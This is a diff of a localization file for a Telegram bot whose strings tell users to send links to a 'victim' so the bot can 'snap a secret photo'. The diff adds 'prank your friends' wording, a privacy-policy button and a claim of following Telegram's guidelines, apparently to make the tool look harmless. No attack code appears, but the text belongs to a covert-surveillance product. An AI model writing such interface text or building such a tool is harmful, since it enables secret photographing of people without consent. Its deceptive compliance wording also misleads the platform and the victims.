@@ -1,13 +1,26 @@
 -accept-policy-message = <i>By using this bot, you agree to our /privacy policy!</i>
 
 start-command =
-    { -accept-policy-message }
+    .message =
+        { -accept-policy-message }
 
-    Send one of the links below to your victim to snap a secret photo 📸
+        📸 <b>Get your links to prank your friends:</b> /links
+
+        <blockquote>
+        We strictly follow Telegrams guidelines to ensure a safe and compliant environment.
+        </blockquote>
+
+    .get-links-button = 📸 Get your unique links!
+    .privacy-policy-button = 🔒 Privacy policy
+    .channel-button = 🔉 Channel
+    .chat-button = 💭 Chat
+
+
+links-command = Send one of the links below to your victim to snap a secret photo 📸
 
 disable-group-chats-event =
     .message = Unfortunately, I am only available in private chats 🙁
-    .button = 🔗 Get your unique link
+    .button = 📸 Get your unique link
 
 my-chat-member-event =
     ⚠️ <b>WARNING</b> ⚠️
